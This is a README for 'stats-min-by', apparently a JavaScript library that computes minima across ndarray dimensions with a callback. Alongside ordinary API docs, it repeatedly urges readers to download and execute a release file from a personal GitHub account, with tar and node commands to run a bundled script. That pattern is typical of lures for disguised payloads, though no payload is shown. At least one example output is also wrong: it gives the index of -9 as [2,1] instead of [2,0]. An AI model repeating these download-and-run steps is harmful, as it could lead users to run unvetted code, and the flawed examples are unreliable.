# stats-min-by — Compute minimum across ndarray dimensions with callback

[![Releases](https://img.shields.io/badge/releases-download-blue?logo=github)](https://github.com/datphamanh201/stats-min-by/releases)

A compact JavaScript library to compute the minimum value along one or more ndarray dimensions using a user-provided callback. It works with plain arrays, typed arrays, and common ndarray shapes. Use the callback to define what "value" means for each element (for example, absolute value, weight, or a custom score).

Download the release file and execute it from the Releases page: https://github.com/datphamanh201/stats-min-by/releases

![min-chart](https://images.unsplash.com/photo-1509395176047-4a66953fd231?ixlib=rb-4.0.3&auto=format&fit=crop&w=1600&q=60)

Why this library
- Solve min-finding tasks when the comparison requires a transform.
- Support multi-dimensional ndarrays and flexible axes selection.
- Work in Node.js and browser bundlers.
- Keep API small and predictable.

Table of contents
- Features
- Installation
- Quickstart
- API
- Examples
- NDArray conventions
- Performance
- Tests and CI
- Contributing
- License

Features
- Compute minimum along one or many axes.
- Accept a callback to map each element to a comparable score.
- Support typed arrays (Float64Array, Int32Array, etc.).
- Return both value and index or full coordinate.
- Handle NaN and inf according to options.
- Zero dependencies.

Install

From npm:
npm install stats-min-by

From GitHub Releases:
Download the release archive and run the provided script. Visit the Releases page and download the build or tarball. Execute the included runner script with Node.js:
1. Open: https://github.com/datphamanh201/stats-min-by/releases
2. Download the release asset (for example, stats-min-by-v1.2.0.tgz).
3. Extract and run:
   tar -xzf stats-min-by-v1.2.0.tgz
   node ./dist/cli.js --help

You must download and execute the release file available at the Releases page: https://github.com/datphamanh201/stats-min-by/releases

Quickstart

Node.js (common usage)
const { minBy, minByAxis } = require('stats-min-by');

// 2D array
const arr = [
  [3, -1, 7],
  [0, 2, -5],
  [4, -2, 1]
];

// Find the minimum by value across the whole array
const globalMin = minBy(arr, x => x);
console.log(globalMin); // { value: -5, index: [1,2] }

// Find the minimum per column (axis 0)
const perColumn = minByAxis(arr, 0, x => x);
console.log(perColumn); // [{value:0,index:[1,0]}, {value:-2,index:[2,1]}, {value:-5,index:[1,2]}]

// Example with absolute value
const minAbs = minBy(arr, Math.abs);
console.log(minAbs); // { value: 0, index: [1,0] }

Browser (ESM)
import { minBy, minByAxis } from 'stats-min-by';

const buffer = new Float64Array([3, -1, 7, 0, 2, -5]);
// Interpret as shape [3,2] with row-major layout
const result = minBy({ data: buffer, shape: [3,2] }, x => Math.abs(x));
console.log(result);

API

Core functions
- minBy(input, mapper[, options])
  - input: Array|TypedArray|ndarray-like
  - mapper: function(value, indexArray) => number
  - options:
    - ignoreNaN: boolean (default: true)
    - returnIndex: boolean (default: true)
    - shape: array (optional; required for flat typed arrays)
  - returns: { value, index } or { value } when returnIndex is false

- minByAxis(input, axis|axes, mapper[, options])
  - axis|axes: number or array of numbers to reduce
  - other params same as minBy
  - returns: a reduced ndarray (one axis removed per axis specified), or a list of minima per slice

Input types
- Plain nested arrays: [[...], [...]]
- Typed arrays with shape: { data: Float64Array, shape: [r,c,...] }
- Objects with get(i,j,...) method (ndarray-like)

Mapper
- Called for every element.
- Signature: mapper(value, indexArray)
- indexArray is an array of indices corresponding to the input shape.
- Return a numeric score. Lower score wins.
- If mapper returns NaN and ignoreNaN is true, mapper result is ignored.

Return formats
- Single minimum across all dimensions:
  { value, index }
- Per-axis minima:
  - For axis 0 on a 2D input, returns array of minima for each column.
  - For multiple axes, returns an ndarray with those axes collapsed.

Examples

1) Minimum by weighted score
const data = [
  [5, 1, 8],
  [2, 9, 4],
  [6, 3, 7]
];

function weight(x, [i, j]) {
  const rowWeight = 1 + i * 0.1;
  const colWeight = 1 + j * 0.05;
  return x * rowWeight * colWeight;
}

console.log(minBy(data, weight));
// returns the element with the lowest weighted score

2) Reduce multiple axes
// Reduce axes [0,1] on a 3D array to compute a per-channel minimum
const tensor = {
  data: new Float32Array(2*3*4),
  shape: [2,3,4]
};

const channelMins = minByAxis(tensor, [0,1], x => x);
console.log(channelMins); // array of length 4

3) Typed arrays with explicit shape
const buf = new Float64Array([3, -1, 7, 0, -9, 2]);
const shape = [3,2]; // 3 rows, 2 cols
const res = minBy({ data: buf, shape }, x => x);
console.log(res); // { value: -9, index: [2,1] }

NDArray conventions

- Row-major order (C-order). Indexing increases fastest in the last dimension.
- Use shape to describe dimensions. For a N-dimensional array, shape has N entries.
- When passing a flat typed array, supply shape or use the ndarray-like object form:
  { data: typedArray, shape: [...] }

Edge cases and behavior

- NaN handling:
  - ignoreNaN true (default): skip NaN mapper results.
  - ignoreNaN false: any NaN mapper result will make the corresponding comparison return NaN if encountered.
- Ties:
  - The first encountered minimum (in row-major scan order) wins.
- Empty arrays:
  - minBy returns { value: undefined, index: null }

Performance

- Single-threaded, tight loops in plain JavaScript.
- Optimized inner loop for typed arrays and simple mappers.
- Low memory overhead. The library scans data in-place and avoids copies.
- For large tensors, prefer typed arrays and simple numeric mappers to get best performance.

Benchmarks (sample)
- 1e6 elements plain array, simple mapper: ~30-80 ms on modern Node.
- 1e7 elements typed array: ~200-600 ms depending on CPU and mapper complexity.
- Perf scales roughly linearly with element count.

CLI

A small CLI ship in the release builds lets you run a quick scan on JSON, CSV, or binary files.

Usage:
node dist/cli.js --file data.json --mapper "x=>Math.abs(x)" --axis 0

The Releases page contains downloadable CLI builds and tarballs. Download the release file and run the CLI from the extracted package: https://github.com/datphamanh201/stats-min-by/releases

Testing

- Run unit tests with npm test.
- Tests cover nested arrays, typed arrays, axis reductions, and mapper edge cases.
- CI runs on Node 12, 14, 16, and 18.

Contributing

- Fork the repository.
- Implement a feature or a fix on a topic branch.
- Open a pull request with tests and short description.
- Follow the code style in the repo.
- Add unit tests for new behavior.

Changelog and releases

- See the Releases page for tagged versions and changelogs.
- Major versions follow semver.
- Download an archived release for offline or constrained environments via the Releases page link above.

Badges and links

[![npm version](https://img.shields.io/npm/v/stats-min-by.svg)](https://www.npmjs.com/package/stats-min-by)
[![License: MIT](https://img.shields.io/badge/license-MIT-green.svg)](LICENSE)
[![Releases](https://img.shields.io/github/release/datphamanh201/stats-min-by.svg)](https://github.com/datphamanh201/stats-min-by/releases)

Community and support

- Open issues for bugs and feature requests.
- Use issues to ask questions about API or behavior.
- Pull requests welcome for fixes and improvements.

Related topics and tags
domain, extent, extremes, javascript, math, mathematics, min, minimum, ndarray, node, node-js, nodejs, range, statistics, stats, stdlib

Assets and images
- Chart image: Unsplash (free image)
- Badges: img.shields.io
- Use repo badges in README to give quick status and downloads.

License
MIT

Emoji cheat sheet
- 🚀 fast compute paths
- 📈 stats and ranges
- 🔍 custom mapper
- 🧩 axis reductions

Keep this repo in your toolbox when you need a small, robust way to compute minima with custom comparison logic.